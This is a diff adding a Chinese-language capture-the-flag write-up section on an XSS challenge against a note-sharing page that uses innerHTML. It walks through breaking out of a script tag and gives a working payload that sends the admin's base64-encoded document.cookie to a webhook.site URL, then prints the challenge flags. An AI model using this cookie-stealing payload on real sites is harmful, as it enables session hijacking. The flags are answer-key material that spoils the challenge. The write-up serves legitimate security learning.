@@ -75,8 +75,25 @@
 	```
 7. flag = `CTF{xss1_9cee45e5db677a1e5cfb4c90}`
 
+---
+# XSS2
 
-
+## 題目
+長得跟 [[#題目|XSS1]] 差不多，但大標變為 `XSS2 - Note Sharing with innerHTML`
+## 解題
+1. 嘗試輸入 `<script>alert(1)</script>`
+   ![[W6-2_note.png]]![[W6-2_note2.png]]
+   -> 被補齊了
+2. 嘗試輸入 `"</script>; <script>alert(1) </script>` -> 成功！
+3. 開 webhook，在 Note 區輸入
+   ```js
+   `"</script>; <script>
+		fetch("https://webhook.site/[臨時網址]?aaa="+btoa(document.cookie))
+	</script>
+   ```
+4. 到 Report to admin 輸入 Note Content 網址，並到 webhook 找
+   ![[W6-2_aaa.png]]
+5. base64 decode -> flag=`CTF{xss2_c1444f62b5a7a02ee55eada8}`
 
 
 ---
